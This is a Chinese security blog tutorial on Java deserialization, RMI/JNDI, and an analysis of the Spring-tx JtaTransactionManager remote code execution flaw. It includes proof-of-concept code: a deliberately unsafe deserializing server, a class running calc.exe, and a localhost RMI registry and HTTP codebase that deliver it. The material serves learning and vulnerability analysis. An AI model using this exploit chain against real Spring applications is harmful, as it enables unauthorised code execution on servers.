0x00 反序列化  

之前对Java一直不太熟悉，不怎么接触Java安全，不了解Java中序列化与反序列化的一些机制，导致很多Java相关的RCE都看不懂，只知道拿来就用，想了想还是要深入了解一下比较好。在PHP中我们可以通过serialize和unserialize来进行序列化相关的操作，到了Java的世界里，就没有这么直白的函数可以用了，相关的两个函数分别是：

    
    
    序列化: ObjectOutputStream.writeObject()  
    反序列化: ObjectInputStream.readObject()

我们先来看一下最基本的序列化方式：

    
    
    package me.lightless.base;  
      
    import java.io.FileInputStream;  
    import java.io.FileOutputStream;  
    import java.io.ObjectInputStream;  
    import java.io.ObjectOutputStream;  
      
    /**  
     * Package: me.lightless.base  
     * Author: lightless <root@lightless.me>  
     * Date: 2018/3/29  
     */  
    public class Base {  
      
    public static void main(String[] args) throws Exception {  
    String hello = "Hello World!";  
      
    // 序列化并写入文件payload.bin  
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("payload.bin"));  
    objectOutputStream.writeObject(hello);  
    objectOutputStream.close();  
      
    // 从文件payload.bin中读取数据并反序列化  
    ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("payload.bin"));  
    String value = (String)objectInputStream.readObject();  
    objectInputStream.close();  
      
    System.out.println("Read value from file: " + value);  
    }  
    }

![image_1c9p2iuccfcvt8bnde1t7m1pf69.png](https://image.3001.net/images/20180613/15288787597464.png!small)

通过`ObjectOutputStream`和`ObjectInputStream`就可以完成最基础的序列化操作。如果想要序列化一个`class`，那么会稍微复杂一些，需要自己实现`Serializable`接口，只有实现了这个接口的类才能被序列化。来看一个简单的例子：

    
    
    package me.lightless.base;  
      
    import java.io.*;  
      
    /**  
     * Package: me.lightless.base  
     * Author: lightless <root@lightless.me>  
     * Date: 2018/3/29  
     */  
    public class ClassBase {  
    public static void main(String[] args) throws Exception {  
      
    VulnObject vulnObject = new VulnObject();  
    vulnObject.value = "new_value";  
      
    // 序列化并写入文件payload.bin  
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("payload.bin"));  
    objectOutputStream.writeObject(vulnObject);  
    objectOutputStream.close();  
      
    // 从文件payload.bin中读取数据并反序列化  
    ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("payload.bin"));  
    VulnObject vulnObject2 = (VulnObject)objectInputStream.readObject();  
    objectInputStream.close();  
      
    System.out.println("value: " + vulnObject2.value);  
    }  
    }  
      
      
    class VulnObject implements Serializable {  
    String value;  
      
    //    private void readObject(ObjectInputStream objectInputStream) throws Exception {  
    //        objectInputStream.defaultReadObject();  
    //        System.out.println("This is new 'readObject' method!");  
    //    }  
    }

![image_1c9p2uusge481b1sual13v8pohm.png](https://image.3001.net/images/20180613/15288788174.png!small)

这个例子中，我们序列化了一个`VulnObject`类的对象，并且成功的反序列化了回来。这里我注释了一个重写的`readObject`方法，在编写自己的类的时候，可以通过重写`readObject`方法来实现在反序列化的时候进行一些特殊的操作。

更加深层的序列化相关的内容我们先姑且按下不表，后面在分析其他漏洞的时候再另行介绍，知道上面这些点就可以分析`Spring-tx.jar`中的漏洞了。  

## 0x01 RMI AND JNDI

另外在开始分析`Spring-tx.jar`中的反序列化漏洞之前，我们还要简单的了解一下`RMI`和`JNDI`，Spring-tx.jar中的反序列化漏洞正是利用了这两个机制来实现的RCE，这两个机制都是为了分布式而服务的。

  * RMI(Remote Method Invocation)，Java远程方法调用，有些类似RPC。相比之下RMI可以访问远程的对象，RPC则不可以，JNDI应用就可以获取到注册在RMI服务上的远程对象。

  * JNDI(Java Naming and Directory Interface)，Java命名和目录接口，简单说就是提供了一组API，可以让我们通过一种统一的方式，便捷的调用各种命名和目录服务（例如LDAP）。

我们可以通过`RMI`协议来获取远程的对象，例如通过`lookup`方法来获取`rmi://127.0.0.1:1099/EvilObject`上的对象，这个时候程序就会去目标主机上的`RMI`服务尝试获取EvilObject这个对象。`RMI`服务可以通过返回一个`Reference`对象，让其去指定的`codebase`处获取对应类的字节码，而这个`codebase`甚至可以是HTTP协议:)就如这个例子，如果RMI服务返回了`javax.naming.Reference("ExportObject","ExportObject",
factoryLocation)`对象，那么程序就会尝试去`factoryLocation`处获取字节码，并且会自动加载然后执行该类的构造函数。  
  

## 0x02 Spring-tx漏洞分析

`Spring-tx`是一个用于处理事务管理相关的包，根据漏洞描述，可以找到是`org.springframework.transaction.jta.JtaTransactionManager`这个类出现了问题。我们先看一下这个类的`readObject`方法。

![image_1c9p5i10skalclu1m041ttc1te313.png](https://image.3001.net/images/20180613/15288789073997.png!small)可以看到，除了调用默认的`readObject`之外，还进行了一些额外的操作，那么漏洞就出现在这些额外的操作中。继续跟进`initUserTransactionAndTransactionManager`这个初始化的方法，可以找到调用了`this.lookupUserTransaction(this.userTransactionName)`。  

![image_1c9p5prg9162v1vpm1ncc1mc1s4r1t.png](https://image.3001.net/images/20180613/15288789457472.png!small)

再继续向下跟进，会发现调用了`this.getJndiTemplate().lookup()`方法，这个就是前文说到的`lookup`方法，可以通过这个方法来传入`rmi://`协议的参数来执行命令。

![image_1c9p5oluvi4r1lk61pccqsp15qi1g-2.png](https://image.3001.net/images/20180613/15288789884851.png!small)

漏洞非常简单，我们来梳理一下调用流程：

    
    
    readObject ->  
    initUserTransactionAndTransactionManager ->  
    lookupUserTransaction ->  
    lookup

最终`lookup`的参数`userTransactionName`是通过`this.userTransactionName`传入的，这个值我们可以在构建`JtaTransactionManager`类的时候来设置为任意值。

调用链有了，再来梳理一下利用流程：

    
    
    发送恶意payload ->  
    Server端接到payload，访问恶意的RMI服务 ->  
    RMI访问HTTP服务获取poc类，返回给Server端 ->  
    Server端反序列化拿到的poc类，并且执行构造函数

接下来的事情就是编写PoC了，参考了一下zerothoughts在Github上给出的PoC。首先是服务端，开个socket接收数据并且反序列化即可。  

    
    
    // filename: server.java  
    import java.io.*;  
    import java.net.*;  
      
    public class ExploitableServer {  
    public static void main(String[] args) {  
    try {  
    int port = 9999;  
    ServerSocket serverSocket = new ServerSocket(port);  
    System.out.println("Server started on port " + serverSocket.getLocalPort());  
    while (true) {  
    Socket socket = serverSocket.accept();  
    System.out.println("Connection received from " + socket.getInetAddress());  
    ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream());  
    try {  
    Object object = objectInputStream.readObject();  
    System.out.println("Read object " + object);  
    } catch (Exception e) {  
    System.out.println("Exception caught while reading object");  
    e.printStackTrace();  
    }  
    }  
    } catch (Exception e) {  
    e.printStackTrace();  
    }  
    }  
    }

我们先来写一个恶意的POC类，负责执行命令。  

    
    
    public class POC {  
    public POC() {  
    try {  
    System.out.println("POC start!");  
    Runtime.getRuntime().exec("calc.exe");  
    } catch (Exception e) {  
    e.printStackTrace();  
    }  
    }  
    }

比较简单，不做过多说明了。下面来编写主要的PoC代码，首先我们需要在本地开启一个HTTPServer，负责输出POC类的字节码，由`HttpFileHandler`类实现：  

    
    
    HttpServer httpServer = HttpServer.create(new InetSocketAddress(8090), 0);  
    httpServer.createContext("/", new HttpFileHandler());  
    httpServer.setExecutor(null);  
    httpServer.start();

`HttpFileHandler`类的代码没有修改，可以参考原PoC。

第二步要开启RMI Registry供Server端来访问，并且与前面编写好的恶意POC类关联起来：

    
    
    System.out.println("Creating RMI Registry");  
    Registry registry = LocateRegistry.createRegistry(1099);  
    Reference reference = new javax.naming.Reference("POC", "POC", "http://127.0.0.1:8090/");  
    ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);  
    // rmi://127.0.0.1:1099/poc233  
    registry.bind("poc233", referenceWrapper);

接下来就是构造一个JtaTransactionManager类来实现我们的调用链完成反序列化的利用：

    
    
    String jndiAddress = "rmi://127.0.0.1:1099/poc233";  
    org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();  
    object.setUserTransactionName(jndiAddress);

最后要做的事情就是把构造好的`JtaTransactionManager`类的对象序列化并发送到Server端即可。

跑起来看下效果：

![image_1c9p8c87e5m7oasuc113g1jso3q.png](https://image.3001.net/images/20180613/15288791788851.png!small)

完整的代码这里就不占用篇幅了，感兴趣的同学可以到GitHub上自取。

  
  

## 0x03 参考文献

  *   

  * 1\. <http://zerothoughts.tumblr.com/post/137769010389/fun-with-jndi-remote-code-injection>

  * 2\. <http://zerothoughts.tumblr.com/post/137831000514/spring-framework-deserialization-rce>

  * 3\. <https://www.ibm.com/support/knowledgecenter/zh/SSYKE2_8.0.0/com.ibm.java.lnx.80.doc/diag/understanding/orb_xmp_server.html>

  * 4\. <https://www.anquanke.com/post/id/87031>

  * 5\. <https://paper.seebug.org/312/>

